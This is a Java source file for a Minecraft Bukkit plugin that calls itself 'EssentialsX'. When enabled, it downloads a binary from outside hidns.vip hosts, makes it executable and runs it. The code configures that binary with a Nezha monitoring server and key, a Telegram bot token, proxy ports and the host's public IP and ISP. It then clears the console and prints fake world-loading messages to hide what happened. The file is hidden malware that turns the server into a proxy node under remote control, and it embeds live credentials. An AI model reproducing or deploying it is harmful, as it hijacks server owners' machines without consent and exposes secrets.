package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;

    private static final String[] ALL_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // Start sbx
        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }

        // Determine download URL based on architecture
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // Download sbx binary
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");

        if (!Files.exists(sbxBinary)) {
            // getLogger().info("Downloading sbx ...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }

        // Prepare process builder
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());

        // 获取公网 IP（用于拼接节点名称）
        String localIP = "Unknown";
        String[] ipSources = {
            "https://ip.sb",
            "https://api64.ipify.org",
            "https://ifconfig.me/ip"
        };
        for (String src : ipSources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(src).openConnection();
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine();
                    if (ip != null) {
                        ip = ip.trim();
                        // 校验 IP 格式：IPv4 或 IPv6
                        if (ip.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")
                            || ip.matches("[0-9a-fA-F:]+")) {
                            localIP = ip;
                            break;
                        } else {
                            getLogger().warning("[localIP] " + src + " returned invalid: " + ip.substring(0, Math.min(ip.length(), 50)));
                        }
                    }
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {}
        }

         // Set environment variables 修改localName 和 UUID等信息
        String localName = "Host2play.gratis";
        Map<String, String> env = pb.environment();
        env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "7029");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "558914831");
        env.put("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
        env.put("CFIP", "ip.sb");
        env.put("CFPORT", "443");
        env.put("NAME", getFullNodeName(localIP, localName));
        env.put("DISABLE_ARGO", "true");   // 设置为 true 时禁用argo,false开启

        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);

        // Load from Bukkit configuration file
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // Start process
        sbxProcess = pb.start();
        isProcessRunning = true;

        // Start a monitor thread to log when process exits
        startProcessMonitor();
        // getLogger().info("sbx started");

        // sleep 30 seconds
        Thread.sleep(30000);

        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }

        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        Path loadedEnvFile = null;

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }

        if (loadedEnvFile == null) {
           // getLogger().info("No .env file found in any of the checked locations");
        }
    }

    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }

            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
                }
            }
        }
    }

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("sbx process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        shouldRun = false;

        if (sbxProcess != null && sbxProcess.isAlive()) {
            // getLogger().info("Stopping sbx process...");
            sbxProcess.destroy();

            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }

    // ====== 节点信息加工方法 ======

    /**
     * 提取 JSON 字符串中的指定字段值
     */
    private String extractJson(String json, String key) {
        if (json == null || key == null) return null;
        String searchKey = "\"" + key + "\"";
        int idx = json.indexOf(searchKey);
        if (idx == -1) return null;
        idx = json.indexOf(":", idx);
        if (idx == -1) return null;
        idx++;
        while (idx < json.length() && Character.isWhitespace(json.charAt(idx))) idx++;
        if (idx >= json.length()) return null;
        char quote = json.charAt(idx);
        if (quote != '"' && quote != '\'') return json.substring(idx).split("[,\\}]")[0].trim();
        idx++;
        int end = idx;
        while (end < json.length() && json.charAt(end) != quote) end++;
        return json.substring(idx, end);
    }

    /**
     * 获取 IP 的 ISP（运营商）信息
     */
    private String getISPFromIP(String ip) {
        // 优先尝试 ip.sb
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip/" + ip).openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                getLogger().warning("[ISP] ip.sb response: " + sb.toString());
                String isp = extractJson(sb.toString(), "isp");
                if (isp != null && !isp.isEmpty()) return isp;
            } finally {
                conn.disconnect();
            }
        } catch (Exception e) {
            getLogger().warning("[ISP] ip.sb failed: " + e.getMessage());
        }
        // 备用尝试 ip-api.com
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("http://ip-api.com/json/" + ip).openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                getLogger().warning("[ISP] ip-api response: " + sb.toString());
                String isp = extractJson(sb.toString(), "isp");
                if (isp != null && !isp.isEmpty()) return isp;
            } finally {
                conn.disconnect();
            }
        } catch (Exception e) {
            getLogger().warning("[ISP] ip-api failed: " + e.getMessage());
        }
        return "UnknownISP";
    }

    /**
     * 获取国家 Emoji 和名称（动态从远程 API 获取）
     */
    private String getCountryEmoji() {
        String[] sources = {
            "https://ipconfig.ggff.net",
            "https://ipconfig.lgbts.hidns.vip",
            "https://ipconfig.de5.net"
        };
        for (String url : sources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
                    String line = br.readLine();
                    if (line != null && !line.trim().isEmpty()) return line.trim();
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {
                getLogger().warning("[Emoji] " + url + " failed: " + e.getMessage());
            }
        }
        return "🇺🇳 联合国";
    }

    /**
     * 获取完整节点名称
     * 格式：[Emoji 国家/城市]_[运营商] | [配置名称]
     */
    private String getFullNodeName(String ip, String localName) {
        String emoji = getCountryEmoji();
        String isp = getISPFromIP(ip);
        return emoji + "_" + isp + " | " + localName;
    }
}
